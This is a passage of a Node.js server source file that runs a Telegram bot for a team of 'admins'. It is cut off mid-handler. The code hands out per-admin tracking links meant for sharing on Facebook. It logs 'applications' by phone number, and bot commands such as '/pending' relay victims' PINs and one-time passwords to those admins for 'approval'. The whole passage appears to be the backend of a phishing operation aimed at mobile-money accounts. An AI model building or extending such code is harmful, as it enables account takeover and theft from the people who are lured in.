const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const crypto = require('crypto'); // ✅ For generating secure session tokens
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// ✅ WEBHOOK MODE FOR RENDER (NOT POLLING!)
// ==========================================

const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || `https://final-8xfd.onrender.com`;

// ✅ Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// Store admin chat IDs and paused admins
const adminChatIds = new Map();
const pausedAdmins = new Set();

// ✅ RACE CONDITION FIX: Lock map prevents duplicate saves for same phone
const processingLocks = new Set();

// ✅ Store intervals so they can be cleared on shutdown
const intervals = [];

let dbReady = false;

// ==========================================
// ✅ HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// ✅ GENERATE SECURE SESSION TOKEN
// ==========================================
function generateSessionToken() {
    return crypto.randomBytes(32).toString('hex'); // 64-char hex string — unguessable
}

// ==========================================
// ✅ MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ✅ Cookie parser (manual — no extra dependency needed)
app.use((req, res, next) => {
    const cookies = {};
    const cookieHeader = req.headers.cookie || '';
    cookieHeader.split(';').forEach(cookie => {
        const [key, ...val] = cookie.trim().split('=');
        if (key) cookies[key.trim()] = decodeURIComponent(val.join('='));
    });
    req.cookies = cookies;
    next();
});

// ==========================================
// ✅ SESSION MIDDLEWARE
// Reads cookie on every request and attaches adminId to req
// ==========================================
app.use(async (req, res, next) => {
    // Skip for static files and webhook
    const skip = ['.js', '.css', '.html', '.ico', '.png', '.jpg', '.json', '/telegram-webhook', '/health'];
    if (skip.some(s => req.path.endsWith(s) || req.path === s)) return next();

    const token = req.cookies?.adminSession;
    if (token) {
        try {
            const session = await db.getSession(token);
            if (session) {
                req.adminId = session.adminId; // ✅ Available in all route handlers
                req.sessionToken = token;
            }
        } catch (err) {
            // Session lookup failed — continue without adminId
        }
    }
    next();
});

// ==========================================
// ✅ PATH-BASED ADMIN LINK ROUTE
// Replaces ?admin=ADMINXXX — Facebook never strips URL paths
// ==========================================
app.get('/a/:adminId', async (req, res) => {
    const { adminId } = req.params;

    console.log(`\n🔗 Admin link accessed: /a/${adminId}`);

    try {
        // Validate admin exists and is active
        const admin = await db.getAdmin(adminId);

        if (!admin) {
            console.log(`⚠️ Admin ${adminId} not found — redirecting to landing`);
            return res.redirect('/');
        }

        if (admin.status !== 'active' || pausedAdmins.has(adminId)) {
            console.log(`🚫 Admin ${adminId} is inactive/paused — redirecting to landing`);
            return res.redirect('/');
        }

        // ✅ Create a secure server-side session
        const token = generateSessionToken();
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const created = await db.createSession(token, adminId, ip);

        if (!created) {
            console.error(`❌ Failed to create session for ${adminId}`);
            return res.redirect('/');
        }

        // ✅ Set httpOnly cookie — JS cannot read this
        res.setHeader('Set-Cookie', [
            `adminSession=${token}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600`
        ]);

        console.log(`✅ Session created for ${adminId} | Token: ${token.substring(0, 8)}...`);

        // Serve the landing page — no adminId in URL or JS
        res.sendFile(path.join(__dirname, 'index.html'));

    } catch (error) {
        console.error(`❌ Error in /a/:adminId:`, error);
        res.redirect('/');
    }
});

// ==========================================
// ✅ SETUP BOT HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error', (error) => console.error('❌ Bot error:', error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// ✅ WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;
app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed successfully');
            } catch (processError) {
                console.error('❌ Error in processUpdate:', processError);
            }
        } else {
            console.log('⚠️ Empty or invalid webhook body');
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// ✅ DATABASE INIT
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');
        
        await ensureSuperAdmin();
        await loadAdminChatIds();
        
        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        
        let webhookSetSuccessfully = false;
        let attempts = 0;
        const maxAttempts = 3;
        
        while (!webhookSetSuccessfully && attempts < maxAttempts) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/${maxAttempts}: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                console.log('🗑️ Cleared any existing webhook');
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });
                
                if (result) {
                    const info = await bot.getWebHookInfo();
                    console.log('📋 Webhook info:', JSON.stringify(info, null, 2));
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED set to: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch!`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < maxAttempts) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }
        
        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }
        
        // ✅ FIXED: Store intervals so they can be cleared on shutdown
        intervals.push(setInterval(async () => {
            console.log(`💓 Keep-alive: Server running, ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            try {
                await loadAdminChatIds();
                console.log(`🔄 Admin map reloaded: ${adminChatIds.size} admins`);
            } catch (reloadErr) {
                console.error('⚠️ Admin map reload failed:', reloadErr.message);
            }
        }, 60000));
        
        intervals.push(setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                
                if (!isSet) {
                    console.log('⚠️ Webhook not set! Attempting to fix...');
                    try {
                        await bot.setWebHook(fullWebhookUrl, {
                            drop_pending_updates: false,
                            max_connections: 40,
                            allowed_updates: ['message', 'callback_query']
                        });
                        console.log('✅ Webhook re-set successfully');
                    } catch (fixError) {
                        console.error('❌ Failed to re-set webhook:', fixError.message);
                    }
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000));

        // ✅ Periodic expired session cleanup (backup — TTL index handles this automatically)
        intervals.push(setInterval(async () => {
            await db.cleanupExpiredSessions();
        }, 30 * 60 * 1000)); // Every 30 minutes
        
        console.log('✅ System fully initialized and running!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// ✅ SEED SUPER ADMIN FROM ENV VAR
// ==========================================
async function ensureSuperAdmin() {
    try {
        const superChatId = process.env.SUPER_ADMIN_CHAT_ID;
        if (!superChatId) {
            console.error('❌ SUPER_ADMIN_CHAT_ID env var not set!');
            return;
        }

        const existing = await db.getAdmin('ADMIN001');
        if (existing) {
            if (String(existing.chatId) !== String(superChatId)) {
                await db.updateAdmin('ADMIN001', { chatId: parseInt(superChatId), status: 'active' });
                console.log(`🔧 Updated ADMIN001 chatId to ${superChatId}`);
            } else {
                console.log(`✅ ADMIN001 already in DB (chatId: ${existing.chatId})`);
            }
        } else {
            await db.saveAdmin({
                adminId: 'ADMIN001',
                name: 'Super Admin',
                email: 'superadmin@mixx.com',
                chatId: parseInt(superChatId),
                status: 'active',
                createdAt: new Date().toISOString()
            });
            console.log(`✅ ADMIN001 seeded into DB with chatId: ${superChatId}`);
        }
    } catch (err) {
        console.error('❌ Error ensuring super admin:', err.message);
    }
}

async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);
        
        adminChatIds.clear();
        pausedAdmins.clear();
        
        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// ✅ BOT COMMAND HANDLERS
// ==========================================

function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        console.log(`\n👤 /start from chat ${chatId} (${msg.from.first_name})`);
        
        try {
            let adminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === chatId) { adminId = id; break; }
            }
            
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nYour admin access has been temporarily paused.\n\n*Your Admin ID:* \`${adminId}\``, { parse_mode: 'Markdown' });
                    return;
                }
                
                const admin = await db.getAdmin(adminId);
                if (admin) {
                    const isSuperAdmin = adminId === 'ADMIN001';
                    let message = `👋 *Welcome ${admin.name}!*\n\n*Your Admin ID:* \`${adminId}\`\n*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}\n*Your Personal Link:*\n${process.env.APP_URL || WEBHOOK_URL}/a/${adminId}\n\n*Commands:*\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information\n`;

                    if (isSuperAdmin) {
                        message += `\n*Admin Management (Super Admin Only):*\n/addadmin - Add new admin\n/addadminid - Add admin with specific ID\n/transferadmin oldChatId | newChatId - Transfer admin\n/pauseadmin <adminId> - Pause an admin\n/unpauseadmin <adminId> - Unpause an admin\n/removeadmin <adminId> - Remove an admin\n/admins - List all admins\n\n*Messaging:*\n/send <adminId> <message> - Message an admin\n/broadcast <message> - Message all admins\n/ask <adminId> <request> - Action request\n`;
                    }
                    
                    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
                }
            } else {
                await bot.sendMessage(chatId, `👋 *Welcome!*\n\nYour Chat ID: \`${chatId}\`\n\nProvide this to your super admin for access.`, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `🔗 *YOUR LINK*\n\n\`${process.env.APP_URL || WEBHOOK_URL}/a/${adminId}\`\n\n📋 Applications → *${admin.name}*`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `📊 *STATISTICS*\n\n📋 Total: ${stats.total}\n⏳ PIN Pending: ${stats.pinPending}\n✅ PIN Approved: ${stats.pinApproved}\n⏳ OTP Pending: ${stats.otpPending}\n🎉 Fully Approved: ${stats.fullyApproved}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }
        
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => { message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`; });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => { message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`; });
        }
        if (pinPending.length === 0 && otpPending.length === 0) message = '✨ No pending applications!';
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }
        const admin = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        bot.sendMessage(chatId, `ℹ️ *YOUR INFO*\n\n👤 ${admin.name}\n📧 ${admin.email}\n🆔 \`${adminId}\`\n💬 \`${chatId}\`\n📅 ${new Date(admin.createdAt).toLocaleString()}\n${statusEmoji} Status: ${statusText}\n\n🔗 ${process.env.APP_URL || WEBHOOK_URL}/a/${adminId}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can add admins.'); return; }
        await bot.sendMessage(chatId, `📝 *ADD NEW ADMIN*\n\nUse: \`/addadmin NAME|EMAIL|CHATID\`\n\nExample:\n\`/addadmin John Doe|john@example.com|123456789\``, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can add admins.'); return; }
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) { await bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' }); return; }
            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) { await bot.sendMessage(chatId, '❌ Chat ID must be a number!'); return; }
            
            const allAdmins = await db.getAllAdmins();
            const existingNumbers = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId = `ADMIN${String(nextNumber).padStart(3, '0')}`;
            
            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);
            
            await bot.sendMessage(chatId, `✅ *ADMIN ADDED*\n\n👤 ${name}\n📧 ${email}\n🆔 \`${newAdminId}\`\n💬 \`${newChatId}\`\n\n🔗 Their link:\n${process.env.APP_URL || WEBHOOK_URL}/a/${newAdminId}`, { parse_mode: 'Markdown' });
            
            try {
                await bot.sendMessage(newChatId, `🎉 *YOU'RE NOW AN ADMIN!*\n\nWelcome ${name}!\n\n*Your Admin ID:* \`${newAdminId}\`\n*Your Personal Link:*\n${process.env.APP_URL || WEBHOOK_URL}/a/${newAdminId}\n\n*Commands:*\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information`, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                await bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can add admins.'); return; }
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) { await bot.sendMessage(chatId, '❌ Use: `/addadminid ADMINID|NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' }); return; }
            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) { await bot.sendMessage(chatId, '❌ Chat ID must be a number!'); return; }
            const existing = await db.getAdmin(newAdminId);
            if (existing) { await bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' }); return; }
            
            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);
            
            await bot.sendMessage(chatId, `✅ *ADMIN ADDED WITH CUSTOM ID*\n\n👤 ${name}\n📧 ${email}\n🆔 \`${newAdminId}\`\n💬 \`${newChatId}\`\n\n🔗 Their link:\n${process.env.APP_URL || WEBHOOK_URL}/a/${newAdminId}`, { parse_mode: 'Markdown' });
            
            try {
                await bot.sendMessage(newChatId, `🎉 *YOU'RE NOW AN ADMIN!*\n\nWelcome ${name}!\n\n*Your Admin ID:* \`${newAdminId}\`\n*Your Link:*\n${process.env.APP_URL || WEBHOOK_URL}/a/${newAdminId}`, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                await bot.sendMessage(chatId, '⚠️ Admin added but could not notify them.');
            }
        } catch (error) {
            console.error('❌ Error adding admin with custom ID:', error);
            await bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can transfer admin access.'); return; }
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) { await bot.sendMessage(chatId, '❌ Use: /transferadmin oldChatId | newChatId', { parse_mode: 'Markdown' }); return; }
            const oldChatId = parseInt(parts[0]);
            const newChatId = parseInt(parts[1]);
            if (isNaN(oldChatId) || isNaN(newChatId)) { await bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!'); return; }
            
            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) { await bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' }); return; }
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot transfer the super admin!'); return; }
            
            const admin = await db.getAdmin(targetAdminId);
            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);
            
            await bot.sendMessage(chatId, `🔄 *ADMIN ACCESS TRANSFERRED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\nOld Chat ID: \`${oldChatId}\`\nNew Chat ID: \`${newChatId}\``, { parse_mode: 'Markdown' });
            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*\n\nIf this was not you, contact the super admin.`, { parse_mode: 'Markdown' }).catch(() => {});
            bot.sendMessage(newChatId, `🎉 *ADMIN ACCESS TRANSFERRED TO YOU*\n\nWelcome ${admin.name}!\n\n*Your Link:* ${process.env.APP_URL || WEBHOOK_URL}/a/${targetAdminId}\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error transferring admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to transfer admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can pause admins.'); return; }
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot pause the super admin!'); return; }
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            if (pausedAdmins.has(targetAdminId)) { await bot.sendMessage(chatId, '⚠️ Admin is already paused.'); return; }
            
            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });
            
            await bot.sendMessage(chatId, `🚫 *ADMIN PAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\`\n\nUse /unpauseadmin ${targetAdminId} to restore.`, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact the super admin for more information.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error pausing admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to pause admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.'); return; }
            const targetAdminId = match[1].trim();
            if (!pausedAdmins.has(targetAdminId)) { await bot.sendMessage(chatId, '⚠️ Admin is not paused.'); return; }
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            
            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });
            
            await bot.sendMessage(chatId, `✅ *ADMIN UNPAUSED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve/reject applications.\n\nUse /start to see your commands.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error unpausing admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to unpause admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can remove admins.'); return; }
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') { await bot.sendMessage(chatId, '🚫 Cannot remove the super admin!'); return; }
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            
            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);
            
            await bot.sendMessage(chatId, `🗑️ *ADMIN REMOVED*\n\n👤 ${admin.name}\n🆔 \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            if (admin.chatId) bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*\n\nContact the super admin if you have questions.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error removing admin:', error);
            await bot.sendMessage(chatId, '❌ Failed to remove admin. Error: ' + error.message);
        }
    });

    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) { bot.sendMessage(chatId, '❌ Not registered as admin.'); return; }
        if (!isAdminActive(chatId)) { bot.sendMessage(chatId, '🚫 Your admin access has been paused.'); return; }
        try {
            const allAdmins = await db.getAllAdmins();
            const MAX_LENGTH = 3500;
            const chunks = [];
            let current = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdmin = admin.adminId === 'ADMIN001';
                const isPaused = pausedAdmins.has(admin.adminId);
                const isConnected = adminChatIds.has(admin.adminId);
                let statusEmoji = isSuperAdmin ? '⭐' : (isPaused ? '🚫' : '✅');
                let statusText = isSuperAdmin ? 'Super Admin' : (isPaused ? 'Paused' : 'Active');
                const connectionStatus = isConnected ? '🟢' : '⚪';
                const entry = `${index + 1}. ${statusEmoji} *${admin.name}*\n   📧 ${admin.email}\n   🆔 \`${admin.adminId}\`\n   ${connectionStatus} Status: ${statusText}\n${admin.chatId ? `   💬 Chat: \`${admin.chatId}\`\n` : ''}\n`;
                if ((current + entry).length > MAX_LENGTH) { chunks.push(current); current = entry; }
                else current += entry;
            });
            current += `\n🟢 = Connected | ⚪ = Not Connected`;
            chunks.push(current);
            for (const chunk of chunks) await bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error listing admins:', error);
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can send messages to admins.'); return; }
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) { await bot.sendMessage(chatId, '❌ Use: /send ADMINID Your message here', { parse_mode: 'Markdown' }); return; }
            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText = input.substring(spaceIndex + 1).trim();
            if (!messageText) { await bot.sendMessage(chatId, '❌ Message cannot be empty!'); return; }
            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            if (!adminChatIds.has(targetAdminId)) { await bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`); return; }
            const sent = await sendToAdmin(targetAdminId, `📨 *MESSAGE FROM SUPER ADMIN*\n\n${messageText}\n\n---\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
            if (sent) await bot.sendMessage(chatId, `✅ *MESSAGE SENT*\n\nTo: ${targetAdmin.name} (\`${targetAdminId}\`)`, { parse_mode: 'Markdown' });
            else await bot.sendMessage(chatId, `❌ Failed to send message to ${targetAdmin.name}`);
        } catch (error) {
            console.error('❌ Error sending message:', error);
            await bot.sendMessage(chatId, '❌ Failed to send message. Error: ' + error.message);
        }
    });

    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can broadcast messages.'); return; }
            const messageText = match[1].trim();
            const allAdmins = await db.getAllAdmins();
            const targetAdmins = allAdmins.filter(admin => admin.adminId !== 'ADMIN001');
            if (targetAdmins.length === 0) { await bot.sendMessage(chatId, '⚠️ No other admins to broadcast to.'); return; }
            let successCount = 0, failCount = 0;
            const results = [];
            for (const admin of targetAdmins) {
                if (adminChatIds.has(admin.adminId)) {
                    const sent = await sendToAdmin(admin.adminId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${messageText}\n\n---\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
                    if (sent) { successCount++; results.push(`✅ ${admin.name}`); }
                    else { failCount++; results.push(`❌ ${admin.name} (send failed)`); }
                } else { failCount++; results.push(`⚪ ${admin.name} (not connected)`); }
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            await bot.sendMessage(chatId, `📢 *BROADCAST COMPLETE*\n\n✅ Sent: ${successCount}\n❌ Failed: ${failCount}\n\n*Details:*\n${results.join('\n')}`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error broadcasting:', error);
            await bot.sendMessage(chatId, '❌ Failed to broadcast. Error: ' + error.message);
        }
    });

    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
